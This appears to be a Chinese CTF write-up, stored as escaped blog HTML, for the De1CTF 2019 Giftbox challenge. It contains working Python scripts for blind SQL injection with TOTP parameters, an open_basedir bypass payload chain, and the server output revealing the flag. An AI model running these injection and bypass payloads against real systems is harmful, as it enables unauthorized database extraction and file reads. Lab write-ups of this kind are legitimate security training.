class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binsea</span><span class=\"params\">(s_payload,len=<span class=\"number\">64</span>)</span>:</span></span><br><span class=\"line\">    result = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len+<span class=\"number\">1</span>):</span><br><span class=\"line\">        left = <span class=\"number\">0</span></span><br><span class=\"line\">        right = <span class=\"number\">126</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> left &lt;= right:</span><br><span class=\"line\">            mid = (left + right) / <span class=\"number\">2</span></span><br><span class=\"line\">            payload = <span class=\"string\">\"ascii(substr((%s),%d,1))&gt;%d\"</span> % (s_payload,x, mid)</span><br><span class=\"line\">            url = <span class=\"string\">'http://257c0b3b-d0fb-4a75-811f-d763da9af540.node3.buuoj.cn/shell.php'</span></span><br><span class=\"line\">            html = get(url, payload)</span><br><span class=\"line\">            <span class=\"comment\"># print(html, '*-*-*-*-*-*', mid)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">'password'</span> <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">                left = mid +<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                right = mid <span class=\"number\">-1</span></span><br><span class=\"line\">        mid = int((left + right + <span class=\"number\">1</span>) / <span class=\"number\">2</span>)</span><br><span class=\"line\">        result += chr(mid)</span><br><span class=\"line\">        print(result)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_database</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'database()'</span></span><br><span class=\"line\">    database = binsea(s_payload,<span class=\"number\">7</span>)</span><br><span class=\"line\">    print(database)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_tabls</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload = <span class=\"string\">'select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\\'giftbox\\''</span></span><br><span class=\"line\">    tables=binsea(s_payload,<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_columns</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload = <span class=\"string\">'select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\\'users\\''</span></span><br><span class=\"line\">    columns=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'select/**/concat(password)/**/from/**/users'</span></span><br><span class=\"line\">    password=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    <span class=\"comment\"># get_database()</span></span><br><span class=\"line\">    <span class=\"comment\"># get_tabls()</span></span><br><span class=\"line\">    <span class=\"comment\"># get_columns()</span></span><br><span class=\"line\">    <span class=\"comment\"># get_data()</span></span><br></pre></td></tr></table></figure>\n\n<p>数据库是giftbox,只有一个users表，有<code>id,username,password</code></p>\n<p>admin的密码是<code>hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</code></p>\n<p>根据密码的提示得到</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[de1ta@de1ta-mbp &#x2F;sandbox]% sh0w_hiiintttt_23333</span><br><span class=\"line\">we add an evil monster named &#39;eval&#39; when launching missiles.</span><br></pre></td></tr></table></figure>\n\n<p>targeting  还有长度限制，code为2，possition为12。</p>\n<p>在phpiofo中设置了open_basedir</p>\n<p><img src=\"/pic/37.png\" alt=\"\"></p>\n<p>关于open_basedir<br>   open_basedir是php.ini中的一个配置选项<br>   它可将用户访问文件的活动范围限制在指定的区域，<br>   假设open_basedir=/home/wwwroot/home/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。<br>   注意用open_basedir指定的限制实际上是前缀,而不是目录名。<br>   举例来说: 若”open_basedir = /dir/user”, 那么目录 “/dir/user” 和 “/dir/user1”都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。</p>\n<p><a href=\"https://www.cnblogs.com/cimuhuashuimu/p/11544487.html\" target=\"_blank\" rel=\"noopener\">绕过参考文章</a></p>\n<p>绕过payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo(file_get_contents(&#39;flag&#39;));&#96;</span><br></pre></td></tr></table></figure>\n\n<p>附上完整脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Time    : 1/14/2020 9:42 PM</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> pyotp</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">sesssion=requests.session()</span><br><span class=\"line\">url = <span class=\"string\">'http://257c0b3b-d0fb-4a75-811f-d763da9af540.node3.buuoj.cn/shell.php'</span></span><br><span class=\"line\">totp = pyotp.TOTP(<span class=\"string\">'GAXG24JTMZXGKZBU'</span>, <span class=\"number\">8</span>, interval=<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">    params = &#123;</span><br><span class=\"line\">        <span class=\"string\">'a'</span>: <span class=\"string\">\"login admin'/**/and/**/(\"</span>+payload+<span class=\"string\">\")# admin\"</span>,</span><br><span class=\"line\">        <span class=\"string\">'totp'</span>: totp.now()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\"># print(params)</span></span><br><span class=\"line\">    html = requests.get(url,params=params,).text</span><br><span class=\"line\">    <span class=\"comment\"># print(html)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> html</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binsea</span><span class=\"params\">(s_payload,len=<span class=\"number\">64</span>)</span>:</span></span><br><span class=\"line\">    result = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len+<span class=\"number\">1</span>):</span><br><span class=\"line\">        left = <span class=\"number\">0</span></span><br><span class=\"line\">        right = <span class=\"number\">126</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> left &lt;= right:</span><br><span class=\"line\">            mid = (left + right) / <span class=\"number\">2</span></span><br><span class=\"line\">            payload = <span class=\"string\">\"ascii(substr((%s),%d,1))&gt;%d\"</span> % (s_payload,x, mid)</span><br><span class=\"line\"></span><br><span class=\"line\">            html = get(url, payload)</span><br><span class=\"line\">            <span class=\"comment\"># print(html, '*-*-*-*-*-*', mid)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">'password'</span> <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">                left = mid +<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                right = mid <span class=\"number\">-1</span></span><br><span class=\"line\">        mid = int((left + right + <span class=\"number\">1</span>) / <span class=\"number\">2</span>)</span><br><span class=\"line\">        result += chr(mid)</span><br><span class=\"line\">        print(result)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_database</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'database()'</span></span><br><span class=\"line\">    database = binsea(s_payload,<span class=\"number\">7</span>)</span><br><span class=\"line\">    print(database)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_tabls</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload = <span class=\"string\">'select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\\'giftbox\\''</span></span><br><span class=\"line\">    tables=binsea(s_payload,<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_columns</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload = <span class=\"string\">'select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\\'users\\''</span></span><br><span class=\"line\">    columns=binsea(s_payload,<span class=\"number\">23</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'select/**/concat(password)/**/from/**/users'</span></span><br><span class=\"line\">    password=binsea(s_payload,<span class=\"number\">13</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">login</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    params = &#123;</span><br><span class=\"line\">        <span class=\"string\">'a'</span>: <span class=\"string\">\"login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;\"</span>,</span><br><span class=\"line\">        <span class=\"string\">'totp'</span>: totp.now()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sesssion.get(url, params=params)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">target</span><span class=\"params\">(code,position)</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    params = &#123;</span><br><span class=\"line\">        <span class=\"string\">'a'</span>: <span class=\"string\">\"targeting\"</span>+code+<span class=\"string\">' '</span>+position,</span><br><span class=\"line\">        <span class=\"string\">'totp'</span>: totp.now()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sesssion.get(url,params=params)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">destruct</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    params = &#123;</span><br><span class=\"line\">        <span class=\"string\">'a'</span>: <span class=\"string\">\"destruct\"</span>,</span><br><span class=\"line\">        <span class=\"string\">'totp'</span>: totp.now()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sesssion.get(url, params=params)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">launch</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    params = &#123;</span><br><span class=\"line\">        <span class=\"string\">'a'</span>: <span class=\"string\">'launch'</span>,</span><br><span class=\"line\">        <span class=\"string\">'totp'</span>: totp.now()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    print(sesssion.get(url, params=params).json())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_password</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"comment\"># get_database()</span></span><br><span class=\"line\">    <span class=\"comment\"># get_tabls()</span></span><br><span class=\"line\">    <span class=\"comment\"># get_columns()</span></span><br><span class=\"line\">    get_data()</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_flag</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    login()</span><br><span class=\"line\">    target(<span class=\"string\">'a'</span>,<span class=\"string\">'chdir'</span>)</span><br><span class=\"line\">    target(<span class=\"string\">'b'</span>,<span class=\"string\">'img'</span>)</span><br><span class=\"line\">    target(<span class=\"string\">'c'</span>,<span class=\"string\">'&#123;$a($b)&#125;'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    target(<span class=\"string\">'d'</span>,<span class=\"string\">'ini_set'</span>)</span><br><span class=\"line\">    target(<span class=\"string\">'e'</span>, <span class=\"string\">'open_base_dir'</span>)</span><br><span class=\"line\">    target(<span class=\"string\">'f'</span>, <span class=\"string\">'..'</span>)</span><br><span class=\"line\">    target(<span class=\"string\">'g'</span>, <span class=\"string\">'&#123;$d($e,$f)&#125;'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    target(<span class=\"string\">'h'</span>, <span class=\"string\">'&#123;$a($f)&#125;'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    target(<span class=\"string\">'i'</span>, <span class=\"string\">'&#123;$a($f)&#125;'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    target(<span class=\"string\">'j'</span>, <span class=\"string\">'&#123;$a($f)&#125;'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    target(<span class=\"string\">'k'</span>,<span class=\"string\">'&#123;$a($f)&#125;'</span> )</span><br><span class=\"line\"></span><br><span class=\"line\">    target(<span class=\"string\">'l'</span>, <span class=\"string\">'/'</span>)</span><br><span class=\"line\">    target(<span class=\"string\">'m'</span>, <span class=\"string\">'&#123;$d($e,$l)&#125;'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    target(<span class=\"string\">'n'</span>, <span class=\"string\">'eaho'</span>)</span><br><span class=\"line\">    target(<span class=\"string\">'o'</span>, <span class=\"string\">'file_get_'</span>)</span><br><span class=\"line\">    target(<span class=\"string\">'p'</span>, <span class=\"string\">'contents'</span>)</span><br><span class=\"line\">    target(<span class=\"string\">'q'</span>, <span class=\"string\">'$o$p'</span>)</span><br><span class=\"line\">    target(<span class=\"string\">'r'</span>, <span class=\"string\">'flag'</span>)</span><br><span class=\"line\">    target(<span class=\"string\">'s'</span>,<span class=\"string\">'&#123;$n($q(r))&#125;'</span> )</span><br><span class=\"line\">    launch()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">\tget_flag():</span><br></pre></td></tr></table></figure>\n\n<p>返回结果</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;'code': 0, 'message': 'Initializing launching system...&lt;br&gt;Setting target: $a = \"chdir\";&lt;br&gt;Reading target: $a = \"chdir\";&lt;br&gt;Setting target: $b = \"img\";&lt;br&gt;Reading target: $b = \"img\";&lt;br&gt;Setting target: $c = \"&#123;$a($b)&#125;\";&lt;br&gt;Reading target: $c = \"1\";&lt;br&gt;Setting target: $d = \"ini_set\";&lt;br&gt;Reading target: $d = \"ini_set\";&lt;br&gt;Setting target: $e = \"open_basedir\";&lt;br&gt;Reading target: $e = \"open_basedir\";&lt;br&gt;Setting target: $f = \"..\";&lt;br&gt;Reading target: $f = \"..\";&lt;br&gt;Setting target: $g = \"&#123;$d($e,$f)&#125;\";&lt;br&gt;Reading target: $g = \"/app:/sandbox\";&lt;br&gt;Setting target: $h = \"&#123;$a($f)&#125;\";&lt;br&gt;Reading target: $h = \"1\";&lt;br&gt;Setting target: $i = \"&#123;$a($f)&#125;\";&lt;br&gt;Reading target: $i = \"1\";&lt;br&gt;Setting target: $j = \"Ly8v\";&lt;br&gt;Reading target: $j = \"Ly8v\";&lt;br&gt;Setting target: $k = \"base64_\";&lt;br&gt;Reading target: $k = \"base64_\";&lt;br&gt;Setting target: $l = \"decode\";&lt;br&gt;Reading target: $l = \"decode\";&lt;br&gt;Setting target: $m = \"$k$l\";&lt;br&gt;Reading target: $m = \"base64_decode\";&lt;br&gt;Setting target: $n = \"&#123;$m($j)&#125;\";&lt;br&gt;Reading target: $n = \"///\";&lt;br&gt;Setting target: $o = \"&#123;$d($e,$n)&#125;\";&lt;br&gt;Reading target: $o = \"..\";&lt;br&gt;Setting target: $p = \"flag\";&lt;br&gt;Reading target: $p = \"flag\";&lt;br&gt;Setting target: $q = \"file_get\";&lt;br&gt;Reading target: $q = \"file_get\";&lt;br&gt;Setting target: $r = \"_contents\";&lt;br&gt;Reading target: $r = \"_contents\";&lt;br&gt;Setting target: $s = \"$q$r\";&lt;br&gt;Reading target: $s = \"file_get_contents\";&lt;br&gt;Setting target: $t = \"&#123;$s($p)&#125;\";&lt;br&gt;Reading target: $t = \"flag&#123;dd8dcd47-5bce-4fe2-b2ee-f2aec667ddd3&#125;\\n\";&lt;br&gt;3..2..1..Fire!&lt;br&gt;All 20 missiles are launched...&lt;br&gt;Cruising...&lt;br&gt;Engaging...Bull\\'s-eye!&lt;br&gt;All targets are eliminated.&lt;br&gt;'&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n","site":{"data":{}},"excerpt":"<h2 id=\"De1CTF-2019-Giftbox\"><a href=\"#De1CTF-2019-Giftbox\" class=\"headerlink\" title=\"[De1CTF 2019]Giftbox\"></a>[De1CTF 2019]Giftbox</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>totp:TOTP算法(Time-based One-time Password algorithm)是一种从共享密钥和当前时间计算一次性密码的算法。 它已被采纳为Internet工程任务组标准RFC 6238，是Initiative for Open Authentication（OATH）的基石，并被用于许多双因素身份验证系统。TOTP是基于散列的消息认证码（HMAC）的示例。 它使用加密哈希函数将密钥与当前时间戳组合在一起以生成一次性密码。 由于网络延迟和不同步时钟可能导致密码接收者必须尝试一系列可能的时间来进行身份验证，因此时间戳通常以30秒的间隔增加，从而减少了潜在的搜索空间。</p>\n<p>SQL盲注</p>\n<p>open_basedir绕过</p>","more":"<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>打开网页发现是类似一个linux终端的界面，cd，ls，cat，clear，help，exix，输入help提示可运行下列命令，ls查看后，发现有一个usage.md</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">login [username] [password]</span><br><span class=\"line\"><span class=\"built_in\">logout</span></span><br><span class=\"line\">launch</span><br><span class=\"line\">targeting [code] [position]</span><br><span class=\"line\">destruct</span><br></pre></td></tr></table></figure>\n\n<p>fuzz后发现要登入，登入抓包的时候发现有一个totp参数</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/shell.php?a=login%20admin%20admin&amp;totp=59858608</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 9fc5cb4b-a3ef-4f38-944a-1390b4f71ebf.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: application/json, text/javascript, */*; q=0.01</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">X-Requested-With</span>: XMLHttpRequest</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Referer</span>: http://9fc5cb4b-a3ef-4f38-944a-1390b4f71ebf.node3.buuoj.cn/</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span>: PHPSESSID=urs1ifeeiqsj6dam5rvs0l50nt</span><br></pre></td></tr></table></figure>\n\n<p>进行login时发现username处存在单引号sql盲注，执行usage中其他操作需要登入</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[de1ta@de1ta-mbp /sandbox]% login admin<span class=\"string\">' admin</span></span><br><span class=\"line\"><span class=\"string\">login fail, user not found.</span></span><br><span class=\"line\"><span class=\"string\">[de1ta@de1ta-mbp /sandbox]% login admin'</span><span class=\"comment\"># admin</span></span><br><span class=\"line\">login fail, password incorrect.</span><br><span class=\"line\">[de1ta@de1ta-mbp /sandbox]% targeting</span><br><span class=\"line\">login first.</span><br><span class=\"line\">[de1ta@de1ta-mbp /sandbox]% launch</span><br><span class=\"line\">login first.</span><br></pre></td></tr></table></figure>\n\n<p>查看源码，再main.js发现了数据提交过程，和服务器totp设置</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">···</span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">[Developer Notes]</span></span><br><span class=\"line\"><span class=\"comment\">OTP Library for Python located in js/pyotp.zip</span></span><br><span class=\"line\"><span class=\"comment\">Server Params:</span></span><br><span class=\"line\"><span class=\"comment\">digits = 8</span></span><br><span class=\"line\"><span class=\"comment\">interval = 5</span></span><br><span class=\"line\"><span class=\"comment\">window = 1</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\">···</span><br><span class=\"line\">···</span><br><span class=\"line\">$.ajax(&#123;</span><br><span class=\"line\">        url: host + <span class=\"string\">'/shell.php?a='</span>+<span class=\"built_in\">encodeURIComponent</span>(input)+<span class=\"string\">'&amp;totp='</span> + <span class=\"keyword\">new</span> TOTP(<span class=\"string\">\"GAXG24JTMZXGKZBU\"</span>,<span class=\"number\">8</span>).genOTP(),</span><br><span class=\"line\">        type: <span class=\"string\">\"GET\"</span>,</span><br><span class=\"line\">        dataType: <span class=\"string\">'json'</span>,</span><br><span class=\"line\">        success: <span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">            e_main.html($(<span class=\"string\">'#main'</span>).html() + <span class=\"string\">'[&lt;span id=\"usr\"&gt;'</span> + usrName + <span class=\"string\">'&lt;/span&gt;@&lt;span class=\"host\"&gt;de1ta-mbp&lt;/span&gt; '</span> + position + <span class=\"string\">']% '</span> + input + <span class=\"string\">'&lt;br/&gt;'</span> + res.message + <span class=\"string\">'&lt;br/&gt;'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (e_console.height()-$(<span class=\"built_in\">window</span>).height()&gt;<span class=\"number\">0</span>)&#123;e_console.css(<span class=\"string\">'top'</span>,-(e_console.height()-$(<span class=\"built_in\">window</span>).height()));&#125;<span class=\"keyword\">else</span>&#123;e_console.css(<span class=\"string\">'top'</span>,<span class=\"number\">5</span>);&#125;</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        error: <span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">            e_main.html($(<span class=\"string\">'#main'</span>).html() + <span class=\"string\">'[&lt;span id=\"usr\"&gt;'</span> + usrName + <span class=\"string\">'&lt;/span&gt;@&lt;span class=\"host\"&gt;de1ta-mbp&lt;/span&gt; '</span> + position + <span class=\"string\">']% '</span> + input + <span class=\"string\">'&lt;br/&gt;System Fatal Error!&lt;br/&gt;'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (e_console.height()-$(<span class=\"built_in\">window</span>).height()&gt;<span 